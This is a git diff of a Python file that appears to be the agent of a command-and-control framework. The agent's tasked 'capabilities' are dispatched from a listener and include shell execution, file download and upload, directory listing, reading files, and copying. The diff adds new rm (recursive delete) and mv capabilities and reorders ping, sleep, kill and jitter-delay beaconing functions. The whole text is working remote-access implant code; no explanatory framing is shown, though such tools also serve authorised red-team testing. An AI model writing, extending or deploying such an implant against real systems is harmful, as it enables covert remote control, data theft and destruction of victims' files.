@@ -28,6 +28,67 @@ EXTRA_HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146
 AGENT_TYPE = "eula_multi"
 
 
+def ping_capability(context):
+    context.connection.post_task_message_to_listener(
+        task_id=context.task_id,
+        success=True,
+    )
+    for _ in range(context.arguments["iterations"]):
+        context.connection.get_task_input_message_from_listener()
+        context.connection.post_task_message_to_listener(
+            task_id=context.task_id,
+            success=True,
+        )
+
+
+def sleep_capability(context):
+    duration = context.arguments["duration"]
+    context.connection.post_task_message_to_listener(
+        task_id=context.task_id,
+        success=True,
+        message=f"Agent is sleeping for {duration} seconds...",
+    )
+    time.sleep(duration)
+
+
+def disconnect_capability(context):
+    duration = context.arguments["duration"]
+    context.connection.post_task_message_to_listener(
+        task_id=context.task_id,
+        success=True,
+        message=(
+            f"Agent is disconnecting and waiting {duration} second(s) "
+            "before attempting to reconnect..."
+        ),
+    )
+    time.sleep(duration)
+    return True  # Signal to disconnect
+
+
+def kill_capability(context):
+    context.connection.post_task_message_to_listener(
+        task_id=context.task_id,
+        success=True,
+        message="Agent is killing itself...",
+    )
+    exit()
+
+
+def delay_capability(context):
+    duration = context.arguments["duration"]
+    jitter = context.arguments["jitter"]
+    context.connection.post_task_message_to_listener(
+        task_id=context.task_id,
+        success=True,
+        message=(
+            f"Agent is updating delay to '{duration}' second(s) with a "
+            f"jitter of '{jitter}'"
+        ),
+    )
+    context.connection.sleep_time = duration
+    context.connection.sleep_time_jitter = jitter
+
+
 def shell_capability(context):
     command = context.arguments["command"]
     timeout = context.arguments["timeout"]
@@ -122,144 +183,6 @@ def shell_capability(context):
         success=True,
         message=output,
     )
-
-
-def ping_capability(context):
-    context.connection.post_task_message_to_listener(
-        task_id=context.task_id,
-        success=True,
-    )
-    for _ in range(context.arguments["iterations"]):
-        context.connection.get_task_input_message_from_listener()
-        context.connection.post_task_message_to_listener(
-            task_id=context.task_id,
-            success=True,
-        )
-
-
-def sleep_capability(context):
-    duration = context.arguments["duration"]
-    context.connection.post_task_message_to_listener(
-        task_id=context.task_id,
-        success=True,
-        message=f"Agent is sleeping for {duration} seconds...",
-    )
-    time.sleep(duration)
-
-
-def disconnect_capability(context):
-    duration = context.arguments["duration"]
-    context.connection.post_task_message_to_listener(
-        task_id=context.task_id,
-        success=True,
-        message=(
-            f"Agent is disconnecting and waiting {duration} second(s) "
-            "before attempting to reconnect..."
-        ),
-    )
-    time.sleep(duration)
-    return True  # Signal to disconnect
-
-
-def kill_capability(context):
-    context.connection.post_task_message_to_listener(
-        task_id=context.task_id,
-        success=True,
-        message="Agent is killing itself...",
-    )
-    exit()
-
-
-def cat_capability(context):
-    try:
-        with open(context.arguments["path"]) as file:
-            content = file.read()
-    except FileNotFoundError:
-        context.connection.post_task_message_to_listener(
-            task_id=context.task_id,
-            success=False,
-            message=f"File not found: {context.arguments['path']}",
-        )
-        return
-    except PermissionError:
-        context.connection.post_task_message_to_listener(
-            task_id=context.task_id,
-            success=False,
-            message=f"Permission denied: {context.arguments['path']}",
-        )
-        return
-    except UnicodeDecodeError as exc:
-        context.connection.post_task_message_to_listener(
-            task_id=context.task_id,
-            success=False,
-            message=(
-                f"Unicode error reading file '{context.arguments['path']}': {str(exc)}"
-            ),
-        )
-        return
-
-    context.connection.post_task_message_to_listener(
-        task_id=context.task_id, success=True, message=content
-    )
-
-
-def cd_capability(context):
-    path = context.arguments["path"]
-    if context.arguments["expand"]:
-        path = os.path.expandvars(path)
-
-    try:
-        os.chdir(path)
-    except FileNotFoundError:
-        context.connection.post_task_message_to_listener(
-            task_id=context.task_id,
-            success=False,
-            message=f"Directory not found: {path}",
-        )
-        return
-    except NotADirectoryError:
-        context.connection.post_task_message_to_listener(
-            task_id=context.task_id,
-            success=False,
-            message=f"Not a directory: {path}",
-        )
-        return
-    except PermissionError:
-        context.connection.post_task_message_to_listener(
-            task_id=context.task_id,
-            success=False,
-            message=f"Permission denied: {path}",
-        )
-        return
-
-    context.connection.post_task_message_to_listener(
-        task_id=context.task_id,
-        success=True,
-        message=f"Changed directory to: {path}",
-    )
-
-
-def pwd_capability(context):
-    context.connection.post_task_message_to_listener(
-        task_id=context.task_id,
-        success=True,
-        message=os.getcwd(),
-    )
-
-
-def delay_capability(context):
-    duration = context.arguments["duration"]
-    jitter = context.arguments["jitter"]
-    context.connection.post_task_message_to_listener(
-        task_id=context.task_id,
-        success=True,
-        message=(
-            f"Agent is updating delay to '{duration}' second(s) with a "
-            f"jitter of '{jitter}'"
-        ),
-    )
-    context.connection.sleep_time = duration
-    context.connection.sleep_time_jitter = jitter
 
 
 def download_capability(context):
@@ -359,105 +282,6 @@ def download_capability(context):
         task_id=context.task_id,
         success=True,
         data={"type": "end_of_transfer"},
-    )
-
-
-def ls_capability(context):
-    path = context.arguments["path"]
-    expand = context.arguments["expand"]
-
-    if expand:
-        path = os.path.expandvars(path)
-
-    if not os.path.exists(path):
-        context.connection.post_task_message_to_listener(
-            task_id=context.task_id,
-            success=False,
-            message=f"Failed to list directory. Path '{path}' does not exist.",
-        )
-        return
-
-    if not os.path.isdir(path):
-        context.connection.post_task_message_to_listener(
-            task_id=context.task_id,
-            success=False,
-            message=f"Failed to list directory. Path '{path}' is not a directory.",
-        )
-        return
-
-    try:
-        entries = os.listdir(path)
-    except PermissionError:
-        context.connection.post_task_message_to_listener(
-            task_id=context.task_id,
-            success=False,
-            message=f"Permission denied listing directory '{path}'.",
-        )
-        return
-
-    context.connection.post_task_message_to_listener(
-        task_id=context.task_id,
-        success=True,
-        message=f"Contents of directory '{path}': {entries}",
-    )
-
-
-def cp_capability(context):
-    source = context.arguments["source"]
-    destination = context.arguments["destination"]
-    recursive = context.arguments["recursive"]
-    expand = context.arguments["expand"]
-    overwrite = context.arguments["overwrite"]
-
-    if expand:
-        source = os.path.expandvars(source)
-        destination = os.path.expandvars(destination)
-    if os.path.exists(destination) and not overwrite:
-        context.connection.post_task_message_to_listener(
-            task_id=context.task_id,
-            success=False,
-            message=f"Failed to copy. Path '{destination}' already exists.",
-        )
-        return
-
-    try:
-        if os.path.isdir(source):
-            if recursive:
-                shutil.copytree(source, destination)
-            else:
-                context.connection.post_task_message_to_listener(
-                    task_id=context.task_id,
-                    success=False,
-                    message=(
-                        f"Failed to copy. Source '{source}' is a directory and the "
-                        f"recursive option is not set."
-                    ),
-                )
-                return
-        else:
-            shutil.copy2(source, destination)
-    except FileNotFoundError:
-        context.connection.post_task_message_to_listener(
-            task_id=context.task_id,
-            success=False,
-            message=f"Failed to copy. Source '{source}' does not exist.",
-        )
-        return
-    except PermissionError:
-        context.connection.post_task_message_to_listener(
-            task_id=context.task_id,
-            success=False,
-            message=(
-                f"Failed to copy. Permission denied for source '{source}' or "
-                f"destination '{destination}'."
-            ),
-        )
-        return
-
-    context.connection.post_task_message_to_listener(
-        task_id=context.task_id,
-        success=True,
-        message=f"Copied {source} to '{destination}'.",
     )
 
 
@@ -572,6 +396,208 @@ def upload_capability(context):
                 message=f"Unknown message type received during upload: {msg_type}",
             )
             break
+
+
+def cd_capability(context):
+    path = context.arguments["path"]
+    if context.arguments["expand"]:
+        path = os.path.expandvars(path)
+
+    try:
+        os.chdir(path)
+    except (FileNotFoundError, NotADirectoryError, PermissionError) as exc:
+        context.connection.post_task_message_to_listener(
+            task_id=context.task_id,
+            success=False,
+            message=f"Failed to change directory to '{path}'. {exc}",
+        )
+        return
+
+    context.connection.post_task_message_to_listener(
+        task_id=context.task_id,
+        success=True,
+        message=f"Changed directory to: {path}",
+    )
+
+
+def pwd_capability(context):
+    context.connection.post_task_message_to_listener(
+        task_id=context.task_id,
+        success=True,
+        message=os.getcwd(),
+    )
+
+
+def ls_capability(context):
+    path = context.arguments["path"]
+    expand = context.arguments["expand"]
+
+    if expand:
+        path = os.path.expandvars(path)
+
+    if not os.path.exists(path):
+        context.connection.post_task_message_to_listener(
+            task_id=context.task_id,
+            success=False,
+            message=f"Failed to list directory. Path '{path}' does not exist.",
+        )
+        return
+
+    if not os.path.isdir(path):
+        context.connection.post_task_message_to_listener(
+            task_id=context.task_id,
+            success=False,
+            message=f"Failed to list directory. Path '{path}' is not a directory.",
+        )
+        return
+
+    try:
+        entries = os.listdir(path)
+    except PermissionError:
+        context.connection.post_task_message_to_listener(
+            task_id=context.task_id,
+            success=False,
+            message=f"Permission denied listing directory '{path}'.",
+        )
+        return
+
+    context.connection.post_task_message_to_listener(
+        task_id=context.task_id,
+        success=True,
+        message=f"Contents of directory '{path}': {entries}",
+    )
+
+
+def cat_capability(context):
+    path = context.arguments["path"]
+
+    try:
+        with open(path) as file:
+            content = file.read()
+    except (FileNotFoundError, PermissionError, UnicodeDecodeError) as exc:
+        context.connection.post_task_message_to_listener(
+            task_id=context.task_id,
+            success=False,
+            message=f"Failed to read file '{path}'. {exc}.",
+        )
+        return
+
+    context.connection.post_task_message_to_listener(
+        task_id=context.task_id, success=True, message=content
+    )
+
+
+def rm_capability(context):
+    path = context.arguments["path"]
+    recursive = context.arguments["recursive"]
+    expand = context.arguments["expand"]
+
+    if expand:
+        path = os.path.expandvars(path)
+
+    try:
+        if recursive:
+            shutil.rmtree(path)
+        else:
+            os.remove(path)
+    except (FileNotFoundError, NotADirectoryError, IsADirectoryError) as exc:
+        context.connection.post_task_message_to_listener(
+            task_id=context.task_id,
+            success=False,
+            message=f"Failed to remove '{path}'. {exc}.",
+        )
+        return
+
+    context.connection.post_task_message_to_listener(
+        task_id=context.task_id,
+        success=True,
+        message=f"Successfully removed '{path}'. ",
+    )
+
+
+def mv_capability(context):
+    source = context.arguments["source"]
+    destination = context.arguments["destination"]
+    expand = context.arguments["expand"]
+
+    if expand:
+        source = os.path.expandvars(source)
+        destination = os.path.expandvars(destination)
+
+    try:
+        shutil.move(source, destination)
+    except (FileNotFoundError, NotADirectoryError, IsADirectoryError) as exc:
+        context.connection.post_task_message_to_listener(
+            task_id=context.task_id,
+            success=False,
+            message=f"Failed to move '{source}' to '{destination}'. {exc}.",
+        )
+        return
+
+    context.connection.post_task_message_to_listener(
+        task_id=context.task_id,
+        success=True,
+        message=f"Successfully moved '{source}' to '{destination}'. ",
+    )
+
+
+def cp_capability(context):
+    source = context.arguments["source"]
+    destination = context.arguments["destination"]
+    recursive = context.arguments["recursive"]
+    expand = context.arguments["expand"]
+    overwrite = context.arguments["overwrite"]
+
+    if expand:
+        source = os.path.expandvars(source)
+        destination = os.path.expandvars(destination)
+    if os.path.exists(destination) and not overwrite:
+        context.connection.post_task_message_to_listener(
+            task_id=context.task_id,
+            success=False,
+            message=f"Failed to copy. Path '{destination}' already exists.",
+        )
+        return
+
+    try:
+        if os.path.isdir(source):
+            if recursive:
+                shutil.copytree(source, destination)
+            else:
+                context.connection.post_task_message_to_listener(
+                    task_id=context.task_id,
+                    success=False,
+                    message=(
+                        f"Failed to copy. Source '{source}' is a directory and the "
+                        f"recursive option is not set."
+                    ),
+                )
+                return
+        else:
+            shutil.copy2(source, destination)
+    except FileNotFoundError:
+        context.connection.post_task_message_to_listener(
+            task_id=context.task_id,
+            success=False,
+            message=f"Failed to copy. Source '{source}' does not exist.",
+        )
+        return
+    except PermissionError:
+        context.connection.post_task_message_to_listener(
+            task_id=context.task_id,
+            success=False,
+            message=(
+                f"Failed to copy. Permission denied for source '{source}' or "
+                f"destination '{destination}'."
+            ),
+        )
+        return
+
+    context.connection.post_task_message_to_listener(
+        task_id=context.task_id,
+        success=True,
+        message=f"Copied {source} to '{destination}'.",
+    )
 
 
 def sleep_random(sleep_time, sleep_time_jitter):
@@ -904,18 +930,20 @@ class Agent:
         self.connection = connection
         self.module_loader = module_loader
         self.capability_dispatch = {
-            "shell": shell_capability,
             "sleep": sleep_capability,
             "delay": delay_capability,
+            "kill": kill_capability,
+            "ping": ping_capability,
+            "shell": shell_capability,
             "download": download_capability,
             "upload": upload_capability,
-            "cat": cat_capability,
-            "cp": cp_capability,
             "cd": cd_capability,
             "ls": ls_capability,
             "pwd": pwd_capability,
-            "ping": ping_capability,
-            "kill": kill_capability,
+            "cat": cat_capability,
+            "cp": cp_capability,
+            "rm": rm_capability,
+            "mv": mv_capability,
         }
 
     def _sleep(self):
